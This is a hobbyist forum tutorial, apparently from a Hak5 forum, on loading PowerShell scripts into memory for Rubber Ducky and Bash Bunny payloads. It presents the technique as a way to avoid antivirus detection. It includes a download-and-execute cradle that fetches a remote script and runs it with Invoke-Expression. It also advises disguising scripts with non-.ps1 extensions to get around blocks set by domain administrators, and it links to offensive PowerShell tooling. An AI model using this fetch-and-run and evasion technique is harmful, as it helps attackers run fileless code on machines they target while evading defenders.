## Running PowerShell scripts in memory
###### Author: Dave-ee Jones
###### Subject: PowerShell
###### Original post: [Link](https://forums.hak5.org/topic/41729-running-powershell-in-memory/)

### DISCLAIMER:
I don't claim to know everything in this area, I am just giving you a general idea and some resources.

So I've seen lots of PowerShell-based scripts (for the Ducky and BB especially), and there are a few people talking about running PS scripts in memory so that most free anti-virus software can't detect the script. Since most newbies don't know how to do this (and even some elderbies), I figured I would give you a few links and a brief explanation myself.

So, without further ado, let's get started!

### First, let's consider; what does loading a script into memory mean?
Well, we all know how variables and functions work, right?
```
var1 = "hello there!"
```
When this bit of code executes it has just told the computer 'Okay, make sure you remember this, now. Var1 equals "hello there!"' and the computer has gone 'K, boss!' and puts it into it's memory, just like we would with a bit of information we've been given. Functions are the same. In Lua (using Lua as an example because it's the language I'm most familiar with) I could do something like this:
```
local var = "hello world!"

local func = function()
	print(var)
end
```
This has put the function 'func' and variable 'var' into memory. 'Func' is executable, so when we call the function like so it will do like so:
```
func()

OUTPUT:
hello world!
```
So we've just executed a function that was first placed in memory, but SOURCED from the script (text file) itself. We can do the same with scripts. We can load a script into a variable, allowing us to call it from memory.

### Okay, that's great, but how do I load a *script* into a variable - and how am I supposed to run it?

First off, we have to remember to store the script outside of the machine we're running the script on. THEN we need to use an amazing PowerShell module called 'Invoke-Expression', which allows us to execute strings. You can see where this is going, right?

If we're getting the script from a website or a webserver, we can do something like this:
```
$url = ‘https://www.justaprank.com/scripts/script1.ps1′
iex ((New ObjectNet.WebClient).DownloadString($url))
```
 This will download the whole contents of the 'script1.ps1' file, allowing us to execute it with 'iex' which is the shorthand alias of 'Invoke-Expression', NOT Internet Explorer.

If we're getting the script from a file hosted on an SMB server, USB (Ducky/BB) or outside source, we can do something like this:
```
iex (Get-Content pathtoscript\script1.txt)
```
The beauty about both of these ways is we don't have to have a specific '.ps1' extension on it, allowing us to load all kinds of scripts that can be disguised as pictures, video, text files etc.

**IN FACT** it's better NOT to have a '.ps1' extension because there are people (especially Domain Administrators) who block '.ps1' scripts from being read/executed, so having a different extension helps greatly, even if loading from an outside source (web server, USB).

So I hope this has helped some of you understand what we mean by running a script in memory, and how powerful it can be! Keep in mind that there are still lots of Anti-virus software that will detect stuff like this, but, unfortunately, most of it is paid software (money-making losers who think money > security..).

Also keep in mind that there are plenty of other ways of storing scripts in memory (one being using C#), but these are (arguably) the easiest.

### And now, resources!

https://securingtomorrow.mcafee.com/business/fileless-malware-execution-with-powershell-is-easier-than-you-may-realize/
https://github.com/PowerShellMafia/PowerSploit/tree/master/CodeExecution
https://clymb3r.wordpress.com/
https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf 
